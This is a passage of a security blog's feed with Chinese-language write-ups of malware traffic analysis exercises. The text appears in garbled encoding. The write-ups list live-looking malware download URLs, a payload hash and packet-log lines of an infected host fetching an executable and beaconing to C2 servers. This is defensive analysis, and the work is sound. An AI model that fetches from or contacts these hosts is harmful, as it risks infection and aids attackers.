title="å…¶ä»–æµ"></a>å…¶ä»–æµ</h3><p><code>10.7.31.101</code>å‘å‡º<code>NBNS</code>æ³¨å†Œè¯·æ±‚åˆ° <code>NBNS</code> æœåŠ¡å™¨ï¼Œå…¶è®¡ç®—æœºåä¸º<code>DESKTOP-DPHW305&lt;20&gt; (Server service)</code></p><p><img src="/images/20200731-Malware/2024-04-11-15-38-41-image.png"></p><p> é€šè¿‡è¿‡æ»¤æ¡ä»¶<strong>kerberos.CNameString</strong>æ¥æŸ¥æ‰¾è´¦æˆ·åç§°</p><blockquote><p>Kerberos æ˜¯ä¸€ä¸ªç½‘ç»œèº«ä»½éªŒè¯åè®®ï¼Œç”¨äºåœ¨ä¸å®‰å…¨çš„ç½‘ç»œä¸­å®‰å…¨åœ°éªŒè¯ç”¨æˆ·å’ŒæœåŠ¡ä¹‹é—´çš„èº«ä»½ã€‚</p><p>ä»¥ä¸‹æ˜¯ Kerberos åè®®çš„å·¥ä½œåŸç†ï¼š</p><ol><li><p><strong>è®¤è¯æœåŠ¡å™¨ï¼ˆASï¼‰</strong>ï¼šç”¨æˆ·å‘ Kerberos è®¤è¯æœåŠ¡å™¨è¯·æ±‚è®¿é—®æœåŠ¡ã€‚AS éªŒè¯ç”¨æˆ·çš„èº«ä»½ï¼Œå¹¶ç”Ÿæˆç”¨äºä¸ Ticket Granting Server (TGS) é€šä¿¡çš„ Ticket-Granting Ticket (TGT)ã€‚TGT æ˜¯å—åŠ å¯†ä¿æŠ¤çš„ï¼Œåªæœ‰ TGS å¯ä»¥è§£å¯†å®ƒã€‚</p></li><li><p><strong>ç¥¨è¯æˆäºˆæœåŠ¡å™¨ï¼ˆTGSï¼‰</strong>ï¼šç”¨æˆ·æ”¶åˆ° TGT åï¼Œå¯ä»¥ä½¿ç”¨å®ƒå‘ TGS è¯·æ±‚è®¿é—®ç‰¹å®šçš„æœåŠ¡ã€‚ç”¨æˆ·å‘ TGS æäº¤ TGT å’ŒæœåŠ¡æ ‡è¯†ç¬¦çš„è¯·æ±‚ã€‚TGS éªŒè¯ç”¨æˆ·çš„ TGTï¼Œå¹¶ç”Ÿæˆä¸€ä¸ªç”¨äºè®¿é—®ç‰¹å®šæœåŠ¡çš„æœåŠ¡ç¥¨è¯ï¼ˆService Ticketï¼‰ã€‚æœåŠ¡ç¥¨è¯ä¹Ÿæ˜¯å—åŠ å¯†ä¿æŠ¤çš„ã€‚</p></li><li><p><strong>æœåŠ¡è¯·æ±‚</strong>ï¼šç”¨æˆ·æ”¶åˆ°æœåŠ¡ç¥¨è¯åï¼Œå¯ä»¥å°†å®ƒä¸æœåŠ¡è¯·æ±‚ä¸€èµ·å‘é€ç»™æœåŠ¡ã€‚æœåŠ¡æ”¶åˆ°è¯·æ±‚åï¼Œä½¿ç”¨å®ƒå’Œè‡ªå·±çš„å¯†é’¥è§£å¯†æœåŠ¡ç¥¨è¯ã€‚å¦‚æœç¥¨è¯æœ‰æ•ˆä¸”æœªè¢«ç¯¡æ”¹ï¼ŒæœåŠ¡å°†å‘ç”¨æˆ·æä¾›æ‰€éœ€çš„æœåŠ¡ã€‚</p></li></ol></blockquote><p><img src="/images/20200731-Malware/2024-04-11-15-54-13-image.png"></p><h3 id="çº¿ç´¢æ¢³ç†"><a href="#çº¿ç´¢æ¢³ç†" class="headerlink" title="çº¿ç´¢æ¢³ç†"></a>çº¿ç´¢æ¢³ç†</h3><ul><li>Environmentï¼ˆè°ƒæŸ¥çš„èµ„äº§ä¿¡æ¯&#x2F;ç¯å¢ƒï¼‰<ul><li>LAN segment range:10.07.31.0&#x2F;24</li><li>Domain:tecsolutions.info</li><li>Domain controller:10.07.31.7</li><li>LAN segment gateway:10.07.31.1</li><li>LAN segment broadcast address:10.07.31.255</li></ul></li><li>Incident Report<ul><li>Executive summary:<br>ç”¨æˆ·gregory.simmonsè¢«æœ¨é©¬æ„ŸæŸ“</li><li>Victim detailsï¼ˆå—å®³è€…ç»†èŠ‚ï¼‰<ul><li>IP address: 10.7.31.101</li><li>MAC address: 00:0c:6e:12:af:38</li><li>User account name: gregory.simmons</li></ul></li><li>Indicators of compromise (IOCs)<ul><li>SHA256 hash:0a3aaa398a6abe7a4ba256812b8b6632fa4595b4ac5c47b459d5a6a911c2d202</li><li>File size:913,503 å­—èŠ‚</li><li>File name:3tknamb7298632293.exe</li><li>File location:<a href="http://jambino.us/tv/DYsPb/">http://jambino.us/tv/DYsPb/</a></li><li>File description:å¯æ‰§è¡Œæ–‡ä»¶</li></ul></li><li>HTTP traffic to retrieve the malware<ul><li>191    2020-07-31 08:25:37.088661    10.7.31.101    191.6.208.51    HTTP    e-dsm.com.br    GET &#x2F;www&#x2F;ZdJCAB&#x2F; HTTP&#x2F;1.1     http (80)    49737 (49737)        488        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>531    2020-07-31 08:26:19.877245    10.7.31.101    67.20.112.81    HTTP    jambino.us    GET &#x2F;tv&#x2F;DYsPb&#x2F; HTTP&#x2F;1.1     http (80)    49751 (49751)        123        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li></ul></li><li>HTTP traffic for remote request infection activity<ul><li>1493    2020-07-31 08:26:34.733614    10.7.31.101    201.235.10.215    HTTP    201.235.10.215    POST &#x2F;RLVIcVHpdWjKMHfJsK&#x2F;bhAzHJy&#x2F;vazwovI5B9BcchWQ&#x2F;d0EvU2Xl&#x2F;HQ7AQetdQggMrPULmis&#x2F; HTTP&#x2F;1.1     http (80)    49815 (49815)        414        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>1649    2020-07-31 08:26:56.312136    10.7.31.101    201.235.10.215    HTTP    201.235.10.215    POST &#x2F;M7aBEffyXE&#x2F;Upa44JYc0iD8C5Co5qj&#x2F;QxcEX6A0fDBvDo&#x2F; HTTP&#x2F;1.1     http (80)    49815 (49815)        414        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>1675    2020-07-31 08:26:57.327828    10.7.31.101    104.236.52.89    HTTP    104.236.52.89:8080    POST &#x2F;y1Oc&#x2F;CRTtjoStAe&#x2F;03wHuC&#x2F; HTTP&#x2F;1.1     http-alt (8080)    49817 (49817)        570        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>1842    2020-07-31 08:27:13.551157    10.7.31.101    201.235.10.215    HTTP    201.235.10.215    POST &#x2F;2lOJG5Lepy9SF&#x2F;6rmms2u4C61LmFD&#x2F;hJubcUz&#x2F;13vVTTA5&#x2F;kRmZYIUJ67VF1I&#x2F;GyiwnO6oOQatOesN4K&#x2F; HTTP&#x2F;1.1     http (80)    49815 (49815)        414        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>1881    2020-07-31 08:27:19.007452    10.7.31.101    201.235.10.215    HTTP    201.235.10.215    POST &#x2F;qKSwAKe1Mi&#x2F;y5QsEBixxmL45MPHwaD&#x2F;smvp&#x2F;78W7iuovnPDTvP2w&#x2F;10jxRo2zF6M&#x2F; HTTP&#x2F;1.1     http (80)    49815 (49815)        414        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>2003    2020-07-31 08:27:29.328238    10.7.31.101    201.235.10.215    HTTP    201.235.10.215    POST &#x2F;o9O08G04DzIZG8OWRp&#x2F; HTTP&#x2F;1.1     http (80)    49815 (49815)        414        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>2543    2020-07-31 08:28:12.784950    10.7.31.101    201.235.10.215    HTTP    201.235.10.215    POST &#x2F;LCWZY47XwmugeO3&#x2F;3z2TvDhczd&#x2F; HTTP&#x2F;1.1     http (80)    49815 (49815)        366        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>2558    2020-07-31 08:28:12.975985    10.7.31.101    104.236.52.89    HTTP    104.236.52.89:8080    POST &#x2F;rQDNZBxm3Rpz&#x2F;YdX3soU3MRPD&#x2F;fXFnwkKVcXuwwBkpsSq&#x2F; HTTP&#x2F;1.1     http-alt (8080)    49825 (49825)        350        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>2685    2020-07-31 08:28:28.385792    10.7.31.101    201.235.10.215    HTTP    201.235.10.215    POST &#x2F;aNIce30YT&#x2F;xzZyFctinQ3Jkn&#x2F; HTTP&#x2F;1.1     http (80)    49815 (49815)        366        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>2697    2020-07-31 08:28:28.655094    10.7.31.101    104.236.52.89    HTTP    104.236.52.89:8080    POST &#x2F;RaGu&#x2F;PUTIkmMWtxHtctq&#x2F;du2EPQGClXV&#x2F; HTTP&#x2F;1.1     http-alt (8080)    49826 (49826)        1490        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>3260    2020-07-31 08:29:21.910776    10.7.31.101    201.235.10.215    HTTP    201.235.10.215    POST &#x2F;4DsE&#x2F; HTTP&#x2F;1.1     http (80)    49815 (49815)        382        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>3861    2020-07-31 08:43:48.725324    10.7.31.101    201.235.10.215    HTTP    201.235.10.215    POST &#x2F;NemVGY4zT&#x2F;f6eDx8v6CbHNUXS&#x2F;gjuMfPtC&#x2F;j2SXoNwzJzR&#x2F; HTTP&#x2F;1.1     http (80)    49985 (49985)        366        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>4037    2020-07-31 08:44:31.428936    10.7.31.101    201.235.10.215    HTTP    201.235.10.215    POST &#x2F;yguqyvZp1YxK083S&#x2F;H5kIaZFW692xUc&#x2F;HLuonj6146&#x2F; HTTP&#x2F;1.1     http (80)    49985 (49985)        366        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>4064    2020-07-31 08:44:36.331335    10.7.31.101    104.236.52.89    HTTP    104.236.52.89:8080    POST &#x2F;xian&#x2F;balloon&#x2F; HTTP&#x2F;1.1  (application&#x2F;x-www-form-urlencoded)    http-alt (8080)    49987 (49987)        722        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>4178    2020-07-31 08:59:10.832559    10.7.31.101    201.235.10.215    HTTP    201.235.10.215    POST &#x2F;VmjfI&#x2F;jygtnUpXR&#x2F;kxLUe7h097jcjEAJPIM&#x2F;u8O5&#x2F;jHD8f&#x2F;NiJ7CP0jmzegr&#x2F; HTTP&#x2F;1.1     http (80)    49989 (49989)        366        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>4414    2020-07-31 08:59:26.656364    10.7.31.101    201.235.10.215    HTTP    201.235.10.215    POST &#x2F;FlpErlAFJoc1f77w3J&#x2F; HTTP&#x2F;1.1     http (80)    49989 (49989)        366        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li><li>4574    2020-07-31 09:13:59.964790    10.7.31.101    201.235.10.215    HTTP    201.235.10.215    POST &#x2F;RoEy0QXUh0&#x2F; HTTP&#x2F;1.1     http (80)    49999 (49999)        366        ASUSTekCOMPU_12:af:38    Cisco_79:48:c2</li></ul></li><li>INVESTIGATION<ul><li>é¦–å…ˆæ£€æŸ¥httpä¼ è¾“çš„exeå¯æ‰§è¡Œæ–‡ä»¶</li><li>å‘ç°C2æµé‡</li></ul></li></ul></li></ul><h2 id="çŸ¥è¯†"><a href="#çŸ¥è¯†" class="headerlink" title="çŸ¥è¯†"></a>çŸ¥è¯†</h2><p><strong>DCERPC</strong></p><blockquote><p>DCERPCï¼ˆDistributed Computing Environment Remote Procedure Callsï¼‰æ˜¯ä¸€ç§è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼ˆRPCï¼‰åè®®ï¼Œç”¨äºåœ¨åˆ†å¸ƒå¼è®¡ç®—ç¯å¢ƒä¸­è¿›è¡Œé€šä¿¡ã€‚å®ƒæœ€åˆæ˜¯ç”±OSFï¼ˆOpen Software Foundationï¼‰å¼€å‘çš„ï¼Œåæ¥æˆä¸ºäº† DCEï¼ˆDistributed Computing Environmentï¼‰æ ‡å‡†çš„ä¸€éƒ¨åˆ†ã€‚</p></blockquote><p><strong>DRSUAPI</strong></p><blockquote><p>DRSUAPIï¼ˆDirectory Replication Service Remote Administration Interfaceï¼‰æ˜¯ç”¨äºç®¡ç† Windows æ´»åŠ¨ç›®å½•ï¼ˆActive Directoryï¼‰å¤åˆ¶æœåŠ¡çš„è¿œç¨‹ç®¡ç†æ¥å£ã€‚å®ƒæä¾›äº†ä¸€ç»„ç”¨äºç®¡ç†å’Œç›‘è§†æ´»åŠ¨ç›®å½•å¤åˆ¶çš„è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼ˆRPCï¼‰æ¥å£ã€‚</p></blockquote><p><strong>LLMNR</strong></p><blockquote><p>LLMNR æ˜¯ Link-Local Multicast Name Resolution çš„ç¼©å†™ï¼Œæ˜¯ä¸€ç§ç”¨äºåœ¨å±€åŸŸç½‘ä¸­è¿›è¡Œä¸»æœºåè§£æçš„åè®®ã€‚å®ƒé€šå¸¸ç”¨äº Windows ç³»ç»Ÿä¸­ï¼Œå¹¶ä¸”æ˜¯ Windows Vista åŠæ›´é«˜ç‰ˆæœ¬ä¸­çš„é»˜è®¤ç½‘ç»œæœåŠ¡ä¹‹ä¸€ã€‚</p></blockquote><p><strong>LDAP</strong></p><blockquote><p>LDAP æ˜¯ Lightweight Directory Access Protocol çš„ç¼©å†™ï¼Œæ˜¯ä¸€ç§ç”¨äºè®¿é—®å’Œç»´æŠ¤åˆ†å¸ƒå¼ç›®å½•æœåŠ¡çš„åè®®ã€‚å®ƒæœ€åˆæ˜¯ç”±å¤§å­¦æä¾›çš„å·¥å…·å’ŒæœåŠ¡çš„è”åˆå¼€å‘å›¢é˜Ÿï¼ˆUniversity of Michiganï¼‰å¼€å‘çš„ï¼Œå¹¶æˆä¸ºäº†äº’è”ç½‘å·¥ç¨‹ä»»åŠ¡ç»„ï¼ˆIETFï¼‰çš„æ ‡å‡†åè®®ã€‚</p></blockquote><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://traffic.y1ng.org/0x3_26-8-2020/">TECSOLUTIONS - Traffic Analysis Train</a></p><p><a href="/images/20200731-Malware/2020-07-31-traffic-analysis-exercise-answers.pdf">2020-07-31-traffic-analysis-exercise-answers.pdf</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;2020-07-31-TRAFFIC-ANALYSIS-EXERCISE-TECSOLUTIONS&quot;&gt;&lt;a href=&quot;#2020-07-31-TRAFFIC-ANALYSIS-EXERCISE-TECSOLUTIONS&quot; class=&quot;headerlink&quot; title=&quot;2020-07-31 - TRAFFIC ANALYSIS EXERCISE - TECSOLUTIONS&quot;&gt;&lt;/a&gt;2020-07-31 - TRAFFIC ANALYSIS EXERCISE - TECSOLUTIONS&lt;/h1&gt;</summary>
    
    
    
    <category term="malware_traffic" scheme="https://2in9ya2.github.io/categories/malware-traffic/"/>
    
    
    <category term="traffic" scheme="https://2in9ya2.github.io/tags/traffic/"/>
    
    <category term="malware" scheme="https://2in9ya2.github.io/tags/malware/"/>
    
  </entry>
  
  <entry>
    <title>PCAP AND INFO FOR AN ISC DIARY</title>
    <link href="https://2in9ya2.github.io/20200804-Malware/"/>
    <id>https://2in9ya2.github.io/20200804-Malware/</id>
    <published>2024-04-11T01:25:09.000Z</published>
    <updated>2025-08-25T07:52:22.811Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2020-08-04-PCAP-AND-INFO-FOR-AN-ISC-DIARY"><a href="#2020-08-04-PCAP-AND-INFO-FOR-AN-ISC-DIARY" class="headerlink" title="2020-08-04 - PCAP AND INFO FOR AN ISC DIARY"></a>2020-08-04 - PCAP AND INFO FOR AN ISC DIARY</h1><span id="more"></span><h2 id="å­¦ä¹ è®°å½•"><a href="#å­¦ä¹ è®°å½•" class="headerlink" title="å­¦ä¹ è®°å½•"></a>å­¦ä¹ è®°å½•</h2><h3 id="HTTPæµ"><a href="#HTTPæµ" class="headerlink" title="HTTPæµ"></a>HTTPæµ</h3><p>é¦–å…ˆæŸ¥çœ‹httpæµï¼Œå¹¶è¿½è¸ªç¬¬ä¸€æ¡æµ<br><img src="/images/20200804-Malware/2024-04-11-09-29-36-image.png"></p><p>å‘ç°å…¶ä¼ è¾“çš„æ˜¯ä¸€ä¸ªå¯æ‰§è¡Œç¨‹åº</p><p><img src="/images/20200804-Malware/2024-04-11-09-30-32-image.png"></p><p>æŸ¥è¯¢è¯·æ±‚çš„åŸŸåï¼Œå‘ç°å…¶ä¸ºæ¶æ„åœ°å€</p><p><img src="/images/20200804-Malware/2024-04-11-09-33-37-image.png"></p><p>å¯¼å‡ºè¯¥æ–‡ä»¶ï¼ˆ<strong>æ³¨æ„ï¼šè¯·å‹¿åœ¨ä¸ªäººç”µè„‘ä¸­å¯¼å‡ºï¼Œè¯·åœ¨è™šæ‹Ÿæœºä¸­å¯¼å‡º</strong>ï¼‰</p><p><img src="/images/20200804-Malware/2024-04-11-09-38-29-image.png"></p><p>è¯¥å›¾ç‰‡æ‰“ä¸å¼€</p><p><img src="/images/20200804-Malware/2024-04-11-09-44-22-image.png"></p><p>ä½¿ç”¨äºŒè¿›åˆ¶åˆ†ææ”»å‡»binwalkè¿›è¡Œåˆ†æï¼š</p><ol><li><p><strong>0x0</strong>: è¿™æ˜¯ä¸€ä¸ªMicrosoftå¯æ‰§è¡Œæ–‡ä»¶ï¼Œé‡‡ç”¨äº†å¯ç§»æ¤æ‰§è¡Œæ ¼å¼ï¼ˆPEï¼‰ã€‚</p></li><li><p><strong>0x457F5</strong>: è¿™æ˜¯ä¸€ä¸ªbixå¤´éƒ¨ï¼Œå…·æœ‰ä¸€äº›å…ƒæ•°æ®ä¿¡æ¯ï¼ŒåŒ…æ‹¬åˆ›å»ºæ—¶é—´ã€æ•°æ®åœ°å€ã€å…¥å£ç‚¹ç­‰ã€‚å…¶OSæ ‡è®°ä¸º4.4BSDï¼Œåç§°ä¸ºâ€lXDâ€ã€‚</p></li><li><p><strong>0x56639</strong>: è¿™ä¹Ÿæ˜¯ä¸€ä¸ªbixå¤´éƒ¨ï¼Œä½†è¿™ä¸ªæ–‡ä»¶çœ‹èµ·æ¥åƒæ˜¯å›ºä»¶æ˜ åƒï¼ˆFirmware Imageï¼‰ã€‚</p></li><li><p><strong>0x6F484</strong>: è¿™æ˜¯ä¸€ä¸ªBase64æ ‡å‡†ç´¢å¼•è¡¨ã€‚</p></li><li><p><strong>0x73C70</strong> å’Œ <strong>0x73C9F</strong>: è¿™æ˜¯HTMLæ–‡æ¡£çš„å¤´éƒ¨å’Œå°¾éƒ¨ã€‚</p></li><li><p><strong>0x74160</strong> å’Œ <strong>0x7418F</strong>: è¿™æ˜¯å¦ä¸€ä¸ªHTMLæ–‡æ¡£çš„å¤´éƒ¨å’Œå°¾éƒ¨ã€‚</p></li><li><p><strong>0xC3EE0</strong> å’Œ <strong>0xC3F09</strong>: è¿™æ˜¯ä¸€ä¸ªPNGå›¾åƒå’Œç›¸åº”çš„Zlibå‹ç¼©æ•°æ®ã€‚</p></li></ol><p><img src="/images/20200804-Malware/2024-04-11-09-46-22-image.png"></p><p>ä½¿ç”¨foremoståˆ†ç¦»è¯¥æ–‡ä»¶ï¼Œå¾—åˆ°exeæ–‡ä»¶å’Œpngå›¾ç‰‡</p><p><img src="/images/20200804-Malware/2024-04-11-09-50-19-image.png"></p><p>æŸ¥çœ‹exeæ–‡ä»¶çš„md5å€¼ï¼Œå¹¶é€šè¿‡virustotalæŸ¥è¯¢</p><p> <img src="/images/20200804-Malware/2024-04-11-09-53-50-image.png"></p><p><img src="/images/20200804-Malware/2024-04-11-09-54-50-image.png"></p><h3 id="åŠ å¯†æµ"><a href="#åŠ å¯†æµ" class="headerlink" title="åŠ å¯†æµ"></a>åŠ å¯†æµ</h3><p>æ— å¯ç–‘æµ  </p><h3 id="çº¿ç´¢æ¢³ç†"><a href="#çº¿ç´¢æ¢³ç†" class="headerlink" title="çº¿ç´¢æ¢³ç†"></a>çº¿ç´¢æ¢³ç†</h3><ul><li>æ¶æ„ç½‘ç«™ï¼š<code>aromaterapiaclinicabrasil.com.br</code></li><li>æ¶æ„æ–‡ä»¶ï¼š<code>87411326.jpg</code></li><li>æ„ŸæŸ“è¿‡ç¨‹ï¼šå—å®³è€…ä¸»æœº<code>10.8.4.101</code>Â è®¿é—®æ¶æ„ç½‘ç«™<code>aromaterapiaclinicabrasil.com.br</code>åï¼Œä¸‹è½½å›¾ç‰‡å½¢å¼çš„æ¶æ„æ–‡ä»¶<code>87411326.jpg</code>ï¼Œè¯¥æ–‡ä»¶æœ¬è´¨æ˜¯ä¸€ä¸ªexeæ–‡ä»¶ï¼Œç”¨excelçš„å›¾æ ‡è¿›è¡Œä¼ªè£…ï¼Œæ¬ºéª—ç”¨æˆ·ç‚¹å‡»ä»è€Œæ„ŸæŸ“</li></ul><h2 id="çŸ¥è¯†"><a href="#çŸ¥è¯†" class="headerlink" title="çŸ¥è¯†"></a>çŸ¥è¯†</h2><p><strong>IGMPv3</strong></p><blockquote><p>IGMPv3ï¼ˆInternet Group Management Protocol version 3ï¼‰æ˜¯ä¸€ç§ç”¨äºåœ¨IPv4ç½‘ç»œä¸­ç®¡ç†ç»„æˆå‘˜å…³ç³»çš„åè®®ã€‚å®ƒæ˜¯IGMPåè®®çš„å‡çº§ç‰ˆæœ¬ï¼Œä¸»è¦ç”¨äºåœ¨å¤šæ’­ç¯å¢ƒä¸‹ç®¡ç†ä¸»æœºå’Œè·¯ç”±å™¨ä¹‹é—´çš„é€šä¿¡ã€‚</p></blockquote><p><strong>NBNS</strong></p><blockquote><p>NBNSï¼ˆNetBIOS Name Serviceï¼‰æ˜¯NetBIOSçš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºåœ¨å±€åŸŸç½‘ä¸­å°†NetBIOSåï¼ˆé€šå¸¸æ˜¯è®¡ç®—æœºåï¼‰è§£æä¸ºIPåœ°å€ã€‚NetBIOSæ˜¯ä¸€ç§æ—©æœŸçš„å±€åŸŸç½‘é€šä¿¡åè®®ï¼Œç”¨äºåœ¨å±€åŸŸç½‘ä¸­æä¾›å‘½åã€ä¼šè¯å’Œæ•°æ®å…±äº«æœåŠ¡ã€‚</p></blockquote><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://traffic.y1ng.org/0x2_24-8-2020/">Pcap and alerts for an ISC diary - Traffic Analysis Train</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;2020-08-04-PCAP-AND-INFO-FOR-AN-ISC-DIARY&quot;&gt;&lt;a href=&quot;#2020-08-04-PCAP-AND-INFO-FOR-AN-ISC-DIARY&quot; class=&quot;headerlink&quot; title=&quot;2020-08-04 - PCAP AND INFO FOR AN ISC DIARY&quot;&gt;&lt;/a&gt;2020-08-04 - PCAP AND INFO FOR AN ISC DIARY&lt;/h1&gt;</summary>
    
    
    
    <category term="malware_traffic" scheme="https://2in9ya2.github.io/categories/malware-traffic/"/>
    
    
    <category term="traffic" scheme="https://2in9ya2.github.io/tags/traffic/"/>
    
    <category term="malware" scheme="https://2in9ya2.github.io/tags/malware/"/>
    
  </entry>
  
  <entry>
    <title>TRAFFIC ANALYSIS EXERCISE - PIZZA-BENDER</title>
    <link href="https://2in9ya2.github.io/20200821-Malware/"/>
    <id>https://2in9ya2.github.io/20200821-Malware/</id>
    <published>2024-04-10T12:15:14.000Z</published>
    <updated>2025-08-25T07:52:22.812Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2020-08-21-TRAFFIC-ANALYSIS-EXERCISE-PIZZA-BENDER"><a href="#2020-08-21-TRAFFIC-ANALYSIS-EXERCISE-PIZZA-BENDER" class="headerlink" title="2020-08-21 - TRAFFIC ANALYSIS EXERCISE - PIZZA-BENDER"></a>2020-08-21 - TRAFFIC ANALYSIS EXERCISE - PIZZA-BENDER</h1><span id="more"></span><h2 id="å­¦ä¹ è®°å½•"><a href="#å­¦ä¹ è®°å½•" class="headerlink" title="å­¦ä¹ è®°å½•"></a>å­¦ä¹ è®°å½•</h2><h3 id="HTTPæµ"><a href="#HTTPæµ" class="headerlink" title="HTTPæµ"></a>HTTPæµ</h3><p>é¦–å…ˆæŸ¥çœ‹HTTPæµ<br><img src="/images/20200821-Malware/image.png"><br>è¿½è¸ªç¬¬ä¸€æ¡æµï¼Œå¯ä»¥çœ‹åˆ°ä¼ è¾“çš„æ˜¯ä¸€ä¸ªDLLå¯æ‰§è¡Œç¨‹åº<br><img src="/images/20200821-Malware/image-1.png"><br>é€šè¿‡virustotalæŸ¥è¯¢è®¿é—®åŸŸåncznw6a.comï¼Œå‘ç°è¯¥åŸŸåå­˜åœ¨æ¶æ„è¡Œä¸º<br><img src="/images/20200821-Malware/image-2.png"><br>éšåè¯·æ±‚åŸŸå<code>ctldl.windowsupdate.com</code>ï¼ŒIPä¸º<code>8.252.146.254</code>ï¼Œå‡è¿”å›304ã€‚<br><img src="/images/20200821-Malware/image-3.png"></p><h3 id="åŠ å¯†æµ"><a href="#åŠ å¯†æµ" class="headerlink" title="åŠ å¯†æµ"></a>åŠ å¯†æµ</h3><p>é€šè¿‡æŸ¥çœ‹TLSæµï¼Œå‘ç°é™¤äº†çŸ¥åçš„åŸŸåï¼Œå­˜åœ¨å…¶ä»–åŸŸå<br>å¦‚<br><img src="/images/20200821-Malware/image-4.png"></p><hr><p><img src="/images/20200821-Malware/image-5.png"></p><hr><p><img src="/images/20200821-Malware/image-6.png"></p><hr><p><img src="/images/20200821-Malware/image-7.png"></p><h3 id="æ¶æ„è½¯ä»¶"><a href="#æ¶æ„è½¯ä»¶" class="headerlink" title="æ¶æ„è½¯ä»¶"></a>æ¶æ„è½¯ä»¶</h3><p>åç»­æ˜¯å¦å¯ä»¥é€šè¿‡è½¯ä»¶åˆ†æï¼Ÿ<br><img src="/images/20200821-Malware/image.png"></p><h3 id="å¯ç–‘åœ°å€"><a href="#å¯ç–‘åœ°å€" class="headerlink" title="å¯ç–‘åœ°å€"></a>å¯ç–‘åœ°å€</h3><table><thead><tr><th align="center">HOST</th><th align="center">IP</th></tr></thead><tbody><tr><td align="center">ldrbravo.case</td><td align="center">45.147.231.132</td></tr><tr><td align="center">sieseetera.club</td><td align="center">89.44.9.186</td></tr><tr><td align="center">ciliabba.cyou</td><td align="center">89.44.9.186</td></tr><tr><td align="center">ubbifeder.cyou</td><td align="center">89.44.9.186</td></tr></tbody></table><h2 id="çŸ¥è¯†"><a href="#çŸ¥è¯†" class="headerlink" title="çŸ¥è¯†"></a>çŸ¥è¯†</h2><p><strong>LDAPåè®®</strong></p><blockquote><p>LDAPï¼ˆè½»é‡çº§ç›®å½•è®¿é—®åè®®ï¼ŒLightweight Directory Access Protocolï¼‰æ˜¯ä¸€ç§ç”¨äºåœ¨ç½‘ç»œä¸Šè®¿é—®å’Œç»´æŠ¤ç›®å½•æœåŠ¡çš„åè®®ã€‚ç›®å½•æœåŠ¡æ˜¯ä¸€ç§å­˜å‚¨å’Œç»„ç»‡ä¿¡æ¯çš„åˆ†å±‚æ•°æ®åº“ï¼Œé€šå¸¸ç”¨äºå­˜å‚¨ç”¨æˆ·ã€ç»„ç»‡ã€è®¾å¤‡ç­‰ä¿¡æ¯ï¼Œå¹¶æä¾›å¿«é€Ÿå’Œæœ‰æ•ˆçš„æ£€ç´¢åŠŸèƒ½ã€‚</p></blockquote><p><strong>KRB5</strong></p><blockquote><p>KRB5 æ˜¯ Kerberos 5 çš„ç¼©å†™ï¼Œæ˜¯ä¸€ç§ç”¨äºç½‘ç»œèº«ä»½éªŒè¯çš„åè®®ã€‚Kerberos æ˜¯ä¸€ç§è®¡ç®—æœºç½‘ç»œèº«ä»½éªŒè¯åè®®ï¼Œæ—¨åœ¨æä¾›å¼ºå¤§çš„èº«ä»½éªŒè¯æœºåˆ¶ï¼Œç¡®ä¿åªæœ‰åˆæ³•ç”¨æˆ·èƒ½å¤Ÿè®¿é—®ç½‘ç»œèµ„æºã€‚</p></blockquote><p><strong>SAMR</strong></p><blockquote><p>SAMRï¼ˆSecurity Accounts Manager Remote Protocolï¼‰æ˜¯ä¸€ç§ç”¨äºè¿œç¨‹ç®¡ç† Windows æ“ä½œç³»ç»Ÿç”¨æˆ·å’Œç»„çš„åè®®ã€‚å®ƒå…è®¸è¿œç¨‹å®¢æˆ·ç«¯åº”ç”¨ç¨‹åºé€šè¿‡ç½‘ç»œä¸ Windows ç³»ç»Ÿä¸Šçš„å®‰å…¨è´¦æˆ·ç®¡ç†å™¨ï¼ˆSAMï¼‰è¿›è¡Œé€šä¿¡ï¼Œä»è€Œå®ç°å¯¹ç”¨æˆ·è´¦æˆ·ã€ç»„è´¦æˆ·å’ŒåŸŸè´¦æˆ·ç­‰çš„ç®¡ç†æ“ä½œã€‚</p></blockquote><p><strong>SMB2</strong></p><blockquote><p>SMB2ï¼ˆServer Message Block version 2ï¼‰æ˜¯ä¸€ç§ç”¨äºåœ¨è®¡ç®—æœºç½‘ç»œä¸Šå…±äº«æ–‡ä»¶ã€æ‰“å°æœºã€ä¸²å£åŠå…¶ä»–èµ„æºçš„åè®®ã€‚å®ƒæ˜¯ SMBï¼ˆServer Message Blockï¼‰åè®®çš„æ›´æ–°ç‰ˆæœ¬ï¼Œæ—¨åœ¨æä¾›æ›´å¿«ã€æ›´å®‰å…¨å’Œæ›´å¯é çš„æ–‡ä»¶å…±äº«æœåŠ¡ã€‚</p></blockquote><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://traffic.y1ng.org/0x1_23-8-2020/">PIZZA-BENDER - Traffic Analysis Train</a></p>]]></content>
